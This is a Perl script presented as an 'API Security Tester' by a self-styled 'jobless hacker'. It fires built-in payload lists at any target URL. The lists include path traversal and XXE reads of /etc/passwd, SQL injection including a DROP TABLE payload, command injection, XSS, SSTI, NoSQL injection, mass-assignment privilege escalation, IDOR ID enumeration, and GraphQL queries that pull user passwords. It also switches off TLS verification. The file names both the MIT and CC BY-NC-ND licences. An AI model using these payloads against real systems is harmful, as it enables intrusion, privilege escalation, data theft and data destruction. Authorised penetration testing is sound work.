#!/usr/bin/perl
#┌────────────────────────────────────────────────────────────────────────┐
#│                                                                        │
#│         ███████╗████████╗ ██████╗ ███████╗██████╗ ████████╗██╗         │
#│         ██╔════╝╚══██╔══╝██╔═══██╗██╔════╝██╔══██╗╚══██╔══╝██║         │
#│         ███████╗   ██║   ██║   ██║█████╗  ██████╔╝   ██║   ██║         │
#│         ╚════██║   ██║   ██║   ██║██╔══╝  ██╔══██╗   ██║   ██║         │
#│         ███████║   ██║   ╚██████╔╝███████╗██║  ██║   ██║   ██║         │
#│         ╚══════╝   ╚═╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝         │
#│                                                                        │
#│                    "old school, still root"                            │
#│                    "stoerti - the jobless hacker"                      │
#│                                                                        │
#│    ┌──────────────────────────────────────────────────────────────┐    │
#│    │  40 years in the trenches.     │  6 months unemployed in DE. │    │
#│    │  They fired the one who knew.  │  This is my legacy.         │    │
#│    │                   -- no patches for reality --               │    │
#│    └──────────────────────────────────────────────────────────────┘    │
#│                                                                        │
#└────────────────────────────────────────────────────────────────────────┘
# MIT License
#
# Copyright (c) 2026 Klaus Baumdick
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

# ============================================================================
# DISCLAIMER
# ============================================================================
#
# This script is intended solely for educational purposes and authorized
# penetration testing in controlled environments.
#
# Unauthorized use of this script against systems without explicit written
# permission is illegal and may result in criminal or civil liability.
#
# The author assumes no responsibility for any misuse, damages, or legal
# consequences arising from the use of this script.
#
# USE AT YOUR OWN RISK.
# ============================================================================
# ======================================================================
# API SECURITY TESTER
# ======================================================================
# Autor:  Klaus Baumdick (stoerti) aka "The jobless hacker"
# Zweck:  Umfassende API Security Tests (GraphQL, REST-Fuzzing,
#         Mass Assignment, IDOR)
# Version: 1.0
# Lizenz: CC BY-NC-ND 4.0
# ======================================================================

use warnings;
use feature 'say';
use Getopt::Long;
use LWP::UserAgent;
use JSON;
use URI::Escape;
use List::Util 'shuffle';
use Time::HiRes 'sleep';
use Term::ANSIColor;
use MIME::Base64;
use Data::Dumper;

# ======================================================================
# KONFIGURATION
# ======================================================================

my $config = {
    target          => '',
    method          => 'GET',
    headers         => {},
    cookies         => {},
    delay           => 0.5,
    threads         => 1,
    verbose         => 0,
    output          => 'api_scan_report.txt',
    proxy           => undef,
    timeout         => 10,
    auth_token      => undef,
    user_agent      => 'API-Security-Tester/1.0'
};

# ======================================================================
# PAYLOADS & TESTDATEN
# ======================================================================
my $payloads = {
    fuzzing => [
        # Path Traversal
        '../../../etc/passwd',
        '..\\..\\..\\windows\\win.ini',
        '%2e%2e%2fetc%2fpasswd',
        '....//....//....//etc/passwd',
        '..;/etc/passwd',

        # SQL Injection
        "' OR '1'='1",
        "'; DROP TABLE users--",
        "' UNION SELECT NULL--",
        "' OR 1=1--",
        "admin'--",
        "1; SELECT * FROM users",

        # XSS
        '<script>alert(1)</script>',
        '"><script>alert(1)</script>',
        'javascript:alert(1)',
        '<img src=x onerror=alert(1)>',

        # SSTI
        '{{7*7}}',
        '${7*7}',
        '<%= 7*7 %>',
        '{{7*"7"}}',

        # NoSQL Injection
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$or": []}',
        '{"$where": "1==1"}',

        # Command Injection
        '; ls -la',
        '| dir',
        '`cat /etc/passwd`',
        '$(cat /etc/passwd)',

        # XXE
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',

        # Buffer Overflow
        'A' x 10000,
        'A' x 100000
    ],

    mass_assignment => [
        # User-Rights Manipulation
        'is_admin=true',
        'role=admin',
        'privilege=superuser',
        'access_level=9999',
        'permissions[]=*',
        'is_superuser=true',
        'user_type=administrator',
        'group=administrators',

        # Account Manipulation
        'email_verified=true',
        'is_verified=1',
        'is_active=1',
        'account_status=active',
        'confirmed=true',

        # Financial Manipulation
        'account_balance=999999',
        'credit=1000000',
        'wallet=999999',
        'points=999999',

        # JSON-based
        '{"isAdmin": true}',
        '{"role": "administrator"}',
        '{"permissions": ["*"]}',
        '{"isVerified": true}',

        # Nested Parameters
        'user[is_admin]=true',
        'user[role]=admin',
        'data[attributes][isAdmin]=true',
        '{"user":{"role":"admin"}}'
    ],

    idor_patterns => [
        # Numeric IDs
        '1', '2', '3', '100', '999', '1000',
        '9999', '10000', '99999', '100000',
        '999999', '1000000',

        # UUIDs (Beispiele)
        '00000000-0000-0000-0000-000000000000',
        '11111111-1111-1111-1111-111111111111',
        'ffffffff-ffff-ffff-ffff-ffffffffffff',

        # Base64 encoded IDs
        encode_base64('1'),
        encode_base64('9999'),
        encode_base64('admin'),

        # Path Traversal in IDs
        '../1',
        '..\\1',
        '1/../../',

        # Array/JSON IDs
        '[1]',
        '{"id":1}',
        'user_id=1'
    ],

    graphql_queries => [
        # Introspection Query
        '{
            __schema {
                types {
                    name
                    fields {
                        name
                        type {
                            name
                            kind
                        }
                    }
                }
            }
        }',

        # Detaillierte Introspection
        '{
            __type(name: "User") {
                name
                fields {
                    name
                    type {
                        name
                        kind
                    }
                }
            }
        }',

        # Query alle User
        '{
            users {
                id
                username
                email
                password
                role
            }
        }',

        # Mutation Test
        'mutation {
            createUser(input: {
                username: "test",
                password: "test123",
                role: "admin"
            }) {
                id
                username
                role
            }
        }'
    ]
};

# ======================================================================
# FARBEN FÜR AUSGABEN
# ======================================================================
my $colors = {
    red         => "\e[31m",
    green       => "\e[32m",
    yellow      => "\e[33m",
    blue        => "\e[34m",
    magenta     => "\e[35m",
    cyan        => "\e[36m",
    white       => "\e[37m",
    bold        => "\e[1m",
    reset       => "\e[0m"
};

# ======================================================================
# FUNKTION: HILFE ANZEIGEN
# ======================================================================
sub show_help {
    print <<"HELP";
${$colors{bold}}${$colors{cyan}}API SECURITY TESTER v1.0${$colors{reset}}
${$colors{yellow}}================================${$colors{reset}}

${$colors{bold}}USAGE:${$colors{reset}}
    $0 --target <URL> [OPTIONEN]

${$colors{bold}}REQUIRED:${$colors{reset}}
    --target, -t     Ziel-URL (z.B. https://api.example.com)

${$colors{bold}}OPTIONEN:${$colors{reset}}
    --method, -m     HTTP Methode (GET|POST|PUT|DELETE) [Default: GET]
    --header, -H     Custom Header (mehrfach verwendbar)
    --cookie, -C     Cookie (mehrfach verwendbar)
    --auth, -a       Authorization Token/Bearer
    --delay, -d      Verzögerung zwischen Requests (Sekunden) [Default: 0.5]
    --timeout, -T    Timeout in Sekunden [Default: 10]
    --proxy, -p      Proxy URL (z.B. http://127.0.0.1:8080)
    --verbose, -v    Ausführliche Ausgabe
    --output, -o     Output Datei [Default: api_scan_report.txt]
    --help, -h       Diese Hilfe anzeigen

${$colors{bold}}TESTS:${$colors{reset}}
    ${$colors{green}}* GraphQL Introspection${$colors{reset}}
    ${$colors{green}}* REST-API Endpunkt-Fuzzing${$colors{reset}}
    ${$colors{green}}* Mass Assignment Testing${$colors{reset}}
    ${$colors{green}}* IDOR (Insecure Direct Object References)${$colors{reset}}

${$colors{bold}}BEISPIELE:${$colors{reset}}
    $0 -t https://api.example.com/graphql
    $0 -t https://api.example.com/users/1 -m PUT -H "X-API-Key: 123"
    $0 -t https://api.example.com/api -v -d 1 -p http://127.0.0.1:8080

HELP
    exit 0;
}

# ======================================================================
# FUNKTION: KOMMANDOZEILENPARAMETER PARSEN
# ======================================================================
sub parse_options {
    GetOptions(
        'target|t=s'    => \$config->{target},
        'method|m=s'    => \$config->{method},
        'header|H=s'    => sub {
            my ($opt, $val) = @_;
            my ($key, $value) = split /=/, $val, 2;
            $config->{headers}{$key} = $value if $key && $value;
        },
        'cookie|C=s'    => sub {
            my ($opt, $val) = @_;
            my ($key, $value) = split /=/, $val, 2;
            $config->{cookies}{$key} = $value if $key && $value;
        },
        'auth|a=s'      => \$config->{auth_token},
        'delay|d=f'     => \$config->{delay},
        'timeout|T=i'   => \$config->{timeout},
        'proxy|p=s'     => \$config->{proxy},
        'verbose|v+'    => \$config->{verbose},
        'output|o=s'    => \$config->{output},
        'help|h'        => sub { show_help() }
    ) or show_help();

    show_help() unless $config->{target};
}

# ======================================================================
# FUNKTION: USERAGENT KONFIGURIEREN
# ======================================================================
sub setup_ua {
    my $ua = LWP::UserAgent->new(
        timeout => $config->{timeout},
        agent   => $config->{user_agent}
    );

    $ua->ssl_opts(
        verify_hostname => 0,
        SSL_verify_mode => 0
    );

    if ($config->{proxy}) {
        $ua->proxy(['http', 'https'], $config->{proxy});
    }

    # Standard-Header
    $ua->default_header('Accept' => '*/*');
    $ua->default_header('Accept-Language' => 'en-US,en;q=0.5');

    # Custom Header
    foreach my $key (keys %{$config->{headers}}) {
        $ua->default_header($key => $config->{headers}{$key});
    }

    # Cookies
    if (keys %{$config->{cookies}}) {
        my $cookie_str = join '; ', map { "$_=$config->{cookies}{$_}" } keys %{$config->{cookies}};
        $ua->default_header('Cookie' => $cookie_str);
    }

    # Auth Token
    if ($config->{auth_token}) {
        $ua->default_header('Authorization' => "Bearer $config->{auth_token}");
    }

    return $ua;
}


# ======================================================================
# FUNKTION: AUSGABE MIT FARBEN (GEFIXT)
# ======================================================================
sub colored_output {
    my ($color, $message) = @_;

    # Prüfen ob die Farbe existiert, sonst Standard verwenden
    if (defined $colors->{$color}) {
        print $colors->{$color};
    } else {
        print $colors->{white} || '';  # Fallback auf weiß
    }

    print $message;
    print $colors->{reset} if defined $colors->{reset};
}

# ======================================================================
# FUNKTION: LOGGING (GEFIXT)
# ======================================================================
sub log_message {
    my ($level, $message) = @_;

    my $color_map = {
        'INFO'  => 'green',
        'WARN'  => 'yellow',
        'ERROR' => 'red',
        'DEBUG' => 'cyan',
        'FOUND' => 'magenta'
    };

    my $color = $color_map->{$level} // 'white';

    my $timestamp = localtime();
    my $log_line = "[$timestamp] [$level] $message";

    # Farbe nur setzen wenn definiert
    if (defined $colors->{$color}) {
        print $colors->{$color};
    }
    print "$log_line\n";
    print $colors->{reset} if defined $colors->{reset};

    # Auch in Datei schreiben
    open(my $fh, '>>', $config->{output}) or warn "Kann Datei nicht öffnen: $!";
    print $fh "$log_line\n";
    close($fh);
}


# ======================================================================
# FUNKTION: REQUEST SENDEN
# ======================================================================
sub send_request {
    my ($ua, $url, $method, $data) = @_;

    $method = uc($method || $config->{method});

    my $req = HTTP::Request->new($method => $url);

    if ($data) {
        if (ref $data eq 'HASH') {
            $req->content_type('application/json');
            $req->content(encode_json($data));
        } else {
            $req->content_type('application/x-www-form-urlencoded');
            $req->content($data);
        }
    }

    log_message('DEBUG', "Sending $method request to: $url") if $config->{verbose} >= 2;

    my $response = $ua->request($req);
    sleep $config->{delay};

    return $response;
}

# ======================================================================
# FUNKTION: GRAPHQL TESTS
# ======================================================================
sub test_graphql {
    my ($ua) = @_;

    log_message('INFO', "Starting GraphQL tests on: $config->{target}");

    my $graphql_url = $config->{target};
    $graphql_url .= '/graphql' unless $graphql_url =~ /graphql/i;

    foreach my $query (@{$payloads->{graphql_queries}}) {
        my $response = send_request($ua, $graphql_url, 'POST', { query => $query });

        if ($response->is_success) {
            my $content = $response->decoded_content;

            if ($content =~ /__schema|User|mutation|fields/i) {
                log_message('FOUND', "GraphQL Introspection erfolgreich: $graphql_url");
                log_message('FOUND', "Response: " . substr($content, 0, 200) . "...") if $config->{verbose};
            }
        }
    }
}

# ======================================================================
# FUNKTION: FUZZING TESTS
# ======================================================================
sub test_fuzzing {
    my ($ua) = @_;

    log_message('INFO', "Starting endpoint fuzzing on: $config->{target}");

    my @endpoints = (
        $config->{target},
        "$config->{target}/api",
        "$config->{target}/v1",
        "$config->{target}/users",
        "$config->{target}/admin",
        "$config->{target}/test"
    );

    foreach my $endpoint (@endpoints) {
        foreach my $payload (@{$payloads->{fuzzing}}) {
            my $fuzzed_url = $endpoint . '/' . uri_escape($payload);

            my $response = send_request($ua, $fuzzed_url, 'GET');

            # Schwachstellen erkennen
            if ($response->is_success) {
                my $content = $response->decoded_content;

                if ($content =~ /root:|uid=|passwd|sql error|mysql|warning|exception/i) {
                    log_message('FOUND', "Mögliche Schwachstelle an: $fuzzed_url");
                    log_message('FOUND', "Response enthält: " . substr($content, 0, 100)) if $config->{verbose};
                }
            }

            # Fehlerhafte Responses können auch interessant sein
            if ($response->code == 500) {
                log_message('WARN', "Internal Server Error bei: $fuzzed_url");
            }
        }
    }
}

# ======================================================================
# FUNKTION: MASS ASSIGNMENT TESTS
# ======================================================================
sub test_mass_assignment {
    my ($ua) = @_;

    log_message('INFO', "Starting mass assignment tests on: $config->{target}");

    # Test mit verschiedenen HTTP Methoden
    foreach my $method ('POST', 'PUT', 'PATCH') {
        foreach my $payload (@{$payloads->{mass_assignment}}) {

            # Parse Payload (JSON oder Form-Data)
            my $data;
            if ($payload =~ /^\{.*\}$/) {
                $data = decode_json($payload);
            } else {
                $data = $payload;
            }

            my $response = send_request($ua, $config->{target}, $method, $data);

            if ($response->is_success) {
                my $content = $response->decoded_content;

                # Prüfen ob Admin-Rechte gesetzt wurden
                if ($content =~ /admin|true|success|updated/i) {
                    log_message('FOUND', "Mögliches Mass Assignment mit: $payload");
                    log_message('FOUND', "Response: " . substr($content, 0, 100)) if $config->{verbose};
                }
            }
        }
    }
}

# ======================================================================
# FUNKTION: IDOR TESTS
# ======================================================================
sub test_idor {
    my ($ua) = @_;

    log_message('INFO', "Starting IDOR tests on: $config->{target}");

    # Extrahiere ID-Pattern aus URL
    my $base_url = $config->{target};
    $base_url =~ s/\d+$/ID_PLACEHOLDER/;  # Ersetze letzte Zahl durch Platzhalter

    foreach my $id (@{$payloads->{idor_patterns}}) {
        my $test_url = $base_url;
        $test_url =~ s/ID_PLACEHOLDER/$id/;

        # Wenn kein Platzhalter, hänge ID an
        if ($test_url eq $base_url) {
            $test_url .= "/$id";
        }

        my $response = send_request($ua, $test_url, 'GET');

        if ($response->is_success) {
            my $content = $response->decoded_content;

            # Prüfe auf Zugriff auf fremde Daten
            if ($content =~ /private|confidential|user|profile|account|email|password/i) {
                log_message('FOUND', "Möglicher IDOR an: $test_url");
                log_message('FOUND', "Daten: " . substr($content, 0, 100)) if $config->{verbose};
            }
        }

        # 403 kann auch interessant sein (Zugriff verweigert vs. 200)
        if ($response->code == 403) {
            log_message('WARN', "Zugriff verweigert für: $test_url");
        }
    }
}

# ======================================================================
# FUNKTION: BANNER ANZEIGEN (GEFIXT)
# ======================================================================
sub show_banner {
    # Sicherstellen dass die Farben definiert sind
    my $bold = $colors->{bold} // '';
    my $magenta = $colors->{magenta} // '';
    my $reset = $colors->{reset} // '';

    print <<"BANNER";
${bold}${magenta}
╔══════════════════════════════════════════════════════════════╗
║                 API SECURITY TESTER v1.0                     ║
║         GraphQL | Fuzzing | Mass Assignment | IDOR           ║
╚══════════════════════════════════════════════════════════════╝
${reset}
BANNER

    log_message('INFO', "Target: $config->{target}");
    log_message('INFO', "Method: $config->{method}");
    log_message('INFO', "Output: $config->{output}");
    log_message('INFO', "Started at: " . localtime());
    print "\n";
}

# ======================================================================
# FUNKTION: REPORT ZUSAMMENFASSUNG
# ======================================================================
sub show_summary {
    log_message('INFO', "=" x 50);
    log_message('INFO', "SCAN ABGESCHLOSSEN");
    log_message('INFO', "=" x 50);
    log_message('INFO', "Kompletter Report in: $config->{output}");
}

# ======================================================================
# HAUPTFUNKTION
# ======================================================================
sub main {
    parse_options();
    show_banner();

    my $ua = setup_ua();

    # Tests durchführen
    test_graphql($ua);
    test_fuzzing($ua);
    test_mass_assignment($ua);
    test_idor($ua);

    show_summary();
}

# ======================================================================
# PROGRAMMSTART
# ======================================================================
main();
__END__

=head1 NAME

API Security Tester - Umfassende API Security Testing Suite

=head1 DESCRIPTION

Dieses Tool führt automatisierte Sicherheitstests auf APIs durch:

=over 4

=item * GraphQL Introspection Queries

=item * REST-API Endpunkt-Fuzzing

=item * Mass Assignment Testing

=item * IDOR (Insecure Direct Object References)

=back

=head1 AUTHOR

Klaus Baumdick (stoerti) aka "The jobless hacker"

=head1 LICENSE

CC BY-NC-ND 4.0

=cut
